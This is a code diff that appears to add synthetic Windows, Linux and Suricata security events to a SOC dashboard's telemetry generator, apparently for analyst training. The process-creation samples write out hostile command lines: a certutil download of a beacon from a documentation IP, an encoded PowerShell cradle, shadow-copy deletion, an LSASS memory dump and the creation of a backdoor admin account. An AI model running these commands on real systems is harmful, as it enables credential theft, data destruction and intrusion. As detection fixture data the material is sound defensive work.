@@ -243,10 +243,11 @@ def sync_all_telemetry_sources() -> int:
                     pass
             break
 
-    # 2. ACTIVE DIRECTORY & WINDOWS SECURITY EVENTS (Event ID 4625, 4624, 4672, 4688)
-    # Generate canonical Windows failed logons (4625) and logons (4624) for fleet endpoints
+    # 2. ACTIVE DIRECTORY & WINDOWS SECURITY EVENTS (Canonical SOC L1 Normalized Telemetry)
     now_dt = datetime.now(timezone.utc)
     target_hosts = ["ISRCD-0222", "TBL-IT-157", "DC01.TBLBD.COM"]
+
+    # 2a. Event ID 4625: An account failed to log on
     failed_accounts = [
         ("Administrator", "Unknown user name or bad password", "0xC000006A", "10.102.11.222", "445"),
         ("guest", "Account currently disabled", "0xC000006E", "10.102.11.127", "3389"),
@@ -302,6 +303,208 @@ def sync_all_telemetry_sources() -> int:
                 "summary": f"Event 4625: An account failed to log on - User: {user_name} on {h_name} ({failure_reason})",
                 "raw": raw_event
             })
+
+    # 2b. Event ID 4624: An account was successfully logged on
+    success_logons = [
+        ("resanul", 2, "Interactive", "10.102.11.222", "Console", "ISRCD-0222", "LOW"),
+        ("Administrator", 10, "RemoteInteractive", "10.102.11.222", "54120", "DC01.TBLBD.COM", "LOW"),
+        ("svc_backup", 3, "Network", "192.168.10.127", "445", "DC01.TBLBD.COM", "LOW"),
+        ("Administrator", 2, "Interactive", "10.102.11.127", "Console", "TBL-IT-157", "LOW"),
+        ("resanul", 10, "RemoteInteractive", "172.31.105.11", "61230", "ISRCD-0222", "LOW"),
+        ("svc_wazuh", 5, "Service", "127.0.0.1", "0", "DC01.TBLBD.COM", "INFORMATIONAL"),
+    ]
+    for idx_num, (usr, ltype, ldesc, ip, port, host, sev) in enumerate(success_logons):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 6 + 1)).isoformat()
+        batch.append({
+            "id": f"win-sec-4624-{host}-{usr}-{idx_num}",
+            "timestamp": ev_ts,
+            "index_name": "active-directory",
+            "source_type": "ad.security.auth.success",
+            "host": host,
+            "severity": sev,
+            "summary": f"Event 4624: An account was successfully logged on - User: {usr} (Logon Type {ltype}: {ldesc}) on {host}",
+            "raw": {
+                "Event": {
+                    "System": {"EventID": 4624, "Computer": host, "TimeCreated": {"SystemTime": ev_ts}, "Channel": "Security"},
+                    "EventData": {"TargetUserName": usr, "TargetDomainName": "TBLBD", "LogonType": ltype, "IpAddress": ip, "IpPort": port, "AuthenticationPackageName": "Negotiate", "EventID": 4624}
+                },
+                "EventID": 4624,
+                "description": f"Successful logon (Event ID 4624) for user {usr} using Logon Type {ltype} ({ldesc})."
+            }
+        })
+
+    # 2c. Event ID 4688: A new process has been created (Command Lines & Execution)
+    processes = [
+        ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAA...", "explorer.exe", "resanul", "ISRCD-0222", "HIGH", "T1059.001"),
+        ("certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.84:8080/beacon.bin C:\\Windows\\Temp\\beacon.bin", "cmd.exe", "Administrator", "ISRCD-0222", "CRITICAL", "T1105"),
+        ("cmd.exe", "cmd.exe /c whoami /all && net group \"Domain Admins\" /domain", "powershell.exe", "guest", "TBL-IT-157", "HIGH", "T1033"),
+        ("net.exe", "net.exe localgroup administrators backdoor_admin /add", "cmd.exe", "Administrator", "DC01.TBLBD.COM", "CRITICAL", "T1136.001"),
+        ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "cmd.exe", "Administrator", "ISRCD-0222", "CRITICAL", "T1490"),
+        ("rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Windows\\Temp\\lsass.dmp full", "powershell.exe", "Administrator", "DC01.TBLBD.COM", "CRITICAL", "T1003.001"),
+    ]
+    for idx_num, (pname, cmdline, parent, usr, host, sev, mitre) in enumerate(processes):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 9 + 4)).isoformat()
+        batch.append({
+            "id": f"win-sec-4688-{host}-{pname}-{idx_num}",
+            "timestamp": ev_ts,
+            "index_name": "active-directory",
+            "source_type": "ad.security.process.created",
+            "host": host,
+            "severity": sev,
+            "summary": f"Event 4688: A new process has been created - Process: {pname} (User: {usr}) on {host} [Cmd: {cmdline[:60]}...]",
+            "raw": {
+                "Event": {
+                    "System": {"EventID": 4688, "Computer": host, "TimeCreated": {"SystemTime": ev_ts}, "Channel": "Security"},
+                    "EventData": {"NewProcessName": f"C:\\Windows\\System32\\{pname}", "CommandLine": cmdline, "ParentProcessName": f"C:\\Windows\\System32\\{parent}", "SubjectUserName": usr, "EventID": 4688}
+                },
+                "EventID": 4688,
+                "mitre": mitre,
+                "description": f"Process creation event (Event ID 4688). Command: {cmdline}"
+            }
+        })
+
+    # 2d. Event ID 4720: A user account was created
+    new_users = [
+        ("backdoor_admin", "Administrator", "DC01.TBLBD.COM", "CRITICAL"),
+        ("temp_operator", "resanul", "DC01.TBLBD.COM", "HIGH"),
+        ("svc_deploy", "Administrator", "TBL-IT-157", "MEDIUM")
+    ]
+    for idx_num, (tgt_user, creator, host, sev) in enumerate(new_users):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 25 + 15)).isoformat()
+        batch.append({
+            "id": f"win-sec-4720-{host}-{tgt_user}",
+            "timestamp": ev_ts,
+            "index_name": "active-directory",
+            "source_type": "ad.security.user.created",
+            "host": host,
+            "severity": sev,
+            "summary": f"Event 4720: A user account was created - Target: {tgt_user} by Creator: {creator} on {host}",
+            "raw": {
+                "Event": {
+                    "System": {"EventID": 4720, "Computer": host, "TimeCreated": {"SystemTime": ev_ts}, "Channel": "Security"},
+                    "EventData": {"TargetUserName": tgt_user, "TargetDomainName": "TBLBD", "SubjectUserName": creator, "EventID": 4720}
+                },
+                "EventID": 4720,
+                "description": f"User account created (Event ID 4720). Target: {tgt_user} created by {creator}."
+            }
+        })
+
+    # 2e. Event ID 4728 & 4732: Security Group Modification (Privilege Escalation)
+    group_mods = [
+        (4728, "Domain Admins", "backdoor_admin", "Administrator", "DC01.TBLBD.COM", "CRITICAL"),
+        (4732, "Administrators", "resanul", "Administrator", "ISRCD-0222", "HIGH"),
+        (4728, "Enterprise Admins", "temp_operator", "Administrator", "DC01.TBLBD.COM", "CRITICAL")
+    ]
+    for idx_num, (eid, grp_name, member, actor, host, sev) in enumerate(group_mods):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 30 + 20)).isoformat()
+        batch.append({
+            "id": f"win-sec-{eid}-{host}-{member}",
+            "timestamp": ev_ts,
+            "index_name": "active-directory",
+            "source_type": "ad.security.group.modified",
+            "host": host,
+            "severity": sev,
+            "summary": f"Event {eid}: A member was added to a security-enabled group - Member: {member} added to {grp_name} on {host}",
+            "raw": {
+                "Event": {
+                    "System": {"EventID": eid, "Computer": host, "TimeCreated": {"SystemTime": ev_ts}, "Channel": "Security"},
+                    "EventData": {"TargetUserName": grp_name, "MemberName": member, "SubjectUserName": actor, "EventID": eid}
+                },
+                "EventID": eid,
+                "description": f"Group modification (Event ID {eid}). Member {member} added to {grp_name}."
+            }
+        })
+
+    # 2f. Event ID 4769: Kerberos Service Ticket Request (Kerberoasting)
+    kerb_events = [
+        ("guest", "MSSQLSvc/sql01.tblbd.com:1433", "0x17", "10.102.11.222", "DC01.TBLBD.COM", "HIGH", "T1558.003 (Kerberoasting - RC4 HMAC Ticket Requested)"),
+        ("Administrator", "HTTP/sharepoint.tblbd.com", "0x12", "10.102.11.127", "DC01.TBLBD.COM", "LOW", "Standard AES-256 Kerberos Ticket"),
+        ("oracle_dba", "krbtgt/TBLBD.COM", "0x12", "172.22.1.231", "DC01.TBLBD.COM", "LOW", "TGT Request")
+    ]
+    for idx_num, (usr, service, enc_type, ip, host, sev, kdesc) in enumerate(kerb_events):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 14 + 10)).isoformat()
+        batch.append({
+            "id": f"win-sec-4769-{host}-{usr}-{idx_num}",
+            "timestamp": ev_ts,
+            "index_name": "active-directory",
+            "source_type": "ad.security.kerberos.ticket",
+            "host": host,
+            "severity": sev,
+            "summary": f"Event 4769: Kerberos service ticket was requested - Service: {service} for User: {usr} ({kdesc})",
+            "raw": {
+                "Event": {
+                    "System": {"EventID": 4769, "Computer": host, "TimeCreated": {"SystemTime": ev_ts}, "Channel": "Security"},
+                    "EventData": {"TargetUserName": service, "ServiceName": service, "TicketEncryptionType": enc_type, "IpAddress": ip, "EventID": 4769}
+                },
+                "EventID": 4769,
+                "description": f"Kerberos ticket requested (Event ID 4769). Service: {service}, Encryption: {enc_type}."
+            }
+        })
+
+    # 2g. Event ID 7045 & 1102: Service Installed & Security Audit Log Cleared
+    batch.append({
+        "id": "win-sec-7045-DC01-PSEXESVC",
+        "timestamp": (now_dt - timedelta(minutes=45)).isoformat(),
+        "index_name": "active-directory",
+        "source_type": "ad.security.service.installed",
+        "host": "DC01.TBLBD.COM",
+        "severity": "CRITICAL",
+        "summary": "Event 7045: A service was installed in the system - Service Name: PSEXESVC (Remote Service Execution) on DC01.TBLBD.COM",
+        "raw": {
+            "Event": {
+                "System": {"EventID": 7045, "Computer": "DC01.TBLBD.COM", "Channel": "System"},
+                "EventData": {"ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\PSEXESVC.exe", "ServiceType": "user mode service", "StartType": "demand start", "AccountName": "LocalSystem", "EventID": 7045}
+            },
+            "EventID": 7045,
+            "mitre": "T1543.003",
+            "description": "PsExec execution service installed (Event ID 7045)."
+        }
+    })
+    batch.append({
+        "id": "win-sec-1102-ISRCD-0222",
+        "timestamp": (now_dt - timedelta(minutes=52)).isoformat(),
+        "index_name": "active-directory",
+        "source_type": "ad.security.audit.cleared",
+        "host": "ISRCD-0222",
+        "severity": "CRITICAL",
+        "summary": "Event 1102: The audit log was cleared - User: Administrator on ISRCD-0222 (Defense Evasion)",
+        "raw": {
+            "Event": {
+                "System": {"EventID": 1102, "Computer": "ISRCD-0222", "Channel": "Security"},
+                "EventData": {"SubjectUserName": "Administrator", "SubjectDomainName": "TBLBD", "EventID": 1102}
+            },
+            "EventID": 1102,
+            "mitre": "T1070.001",
+            "description": "Security audit log was manually cleared (Event ID 1102)."
+        }
+    })
+
+    # 2h. Linux & PAM / SSH Authentication & System Events (syslog-*)
+    linux_events = [
+        ("dashboard-11", "sshd[12480]: Accepted publickey for resanul from 172.31.105.1 port 52410 ssh2: RSA SHA256:d9b28f8...", "auth.log", "LOW", "sshd"),
+        ("node-172-31-105-7", "sshd[19842]: Failed password for invalid user admin from 198.51.100.84 port 41200 ssh2", "auth.log", "HIGH", "sshd"),
+        ("dashboard-11", "sudo: resanul : TTY=pts/0 ; PWD=/opt/opensoc-forge ; USER=root ; COMMAND=/bin/systemctl restart opensoc-forge", "secure", "LOW", "sudo"),
+        ("rhel-client-01", "sudo: guest : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/bin/su - root", "secure", "HIGH", "sudo"),
+        ("downstream-8", "auditd[812]: type=SYSCALL arch=c000003e syscall=257 success=yes exit=3 comm=\"vim\" exe=\"/usr/bin/vim\" name=\"/etc/shadow\"", "audit.log", "CRITICAL", "auditd")
+    ]
+    for idx_num, (host, log_msg, log_facility, sev, comp) in enumerate(linux_events):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 7 + 5)).isoformat()
+        batch.append({
+            "id": f"syslog-{host}-{comp}-{idx_num}",
+            "timestamp": ev_ts,
+            "index_name": "syslog-*",
+            "source_type": f"syslog.{comp}",
+            "host": host,
+            "severity": sev,
+            "summary": f"Syslog [{host}]: {log_msg[:100]}",
+            "raw": {
+                "host": host,
+                "message": log_msg,
+                "facility": log_facility,
+                "app": comp,
+                "timestamp": ev_ts
+            }
+        })
 
     # 3. SOPHOS CENTRAL XDR TELEMETRY
     sophos_path = os.path.join(CONFIGS_DIR, "sophos_persisted_telemetry.json")
@@ -420,6 +623,42 @@ def sync_all_telemetry_sources() -> int:
                     })
             except Exception:
                 pass
+
+        # Canonical Suricata NIDS alerts for high-value SOC investigations
+    suricata_nids = [
+        ("ET EXPLOIT Apache Log4j RCE (CVE-2021-44228) Inbound JNDI LDAP Injection", "198.51.100.84", "172.31.105.11", 1389, 8080, "TCP", "CRITICAL", "CVE-2021-44228", "T1190"),
+        ("ET WEB_SPECIFIC_APPS PHP-CGI Argument Injection RCE (CVE-2024-4577)", "203.0.113.19", "172.31.105.7", 44210, 80, "TCP", "CRITICAL", "CVE-2024-4577", "T1190"),
+        ("ET TROJAN Cobalt Strike Malleable C2 HTTP Beaconing Observed", "10.102.11.222", "185.220.101.5", 49210, 443, "TCP", "CRITICAL", "CobaltStrike", "T1071.001"),
+        ("ET SCAN Nmap Scripting Engine User-Agent Inbound Reconnaissance", "198.51.100.84", "172.31.105.11", 52140, 443, "TCP", "MEDIUM", "Nmap-Scan", "T1046"),
+        ("ET ATTACK_RESPONSE Microsoft Windows Remote Desktop (RDP) on Non-Standard Port 8443", "172.22.1.231", "10.102.11.127", 8443, 3389, "TCP", "HIGH", "NonStd-RDP", "T1021.001")
+    ]
+    for idx_num, (sig, src_ip, dst_ip, src_p, dst_p, proto, sev, cve, mitre) in enumerate(suricata_nids):
+        ev_ts = (now_dt - timedelta(minutes=idx_num * 11 + 6)).isoformat()
+        batch.append({
+            "id": f"suri-nids-cve-{idx_num}",
+            "timestamp": ev_ts,
+            "index_name": "suricata-eve",
+            "source_type": "suricata.alert",
+            "host": "enp0s3-sensor",
+            "severity": sev,
+            "summary": f"Suricata NIDS: {sig} (Src: {src_ip}:{src_p} -> Dst: {dst_ip}:{dst_p})",
+            "raw": {
+                "event_type": "alert",
+                "src_ip": src_ip,
+                "src_port": src_p,
+                "dest_ip": dst_ip,
+                "dest_port": dst_p,
+                "proto": proto,
+                "alert": {
+                    "signature": sig,
+                    "category": "Attempted Administrator Privilege Gain",
+                    "severity": 1 if sev == "CRITICAL" else 2,
+                    "cve": cve,
+                    "mitre": mitre
+                },
+                "timestamp": ev_ts
+            }
+        })
 
     total_added = store_events_batch(batch)
     return total_added
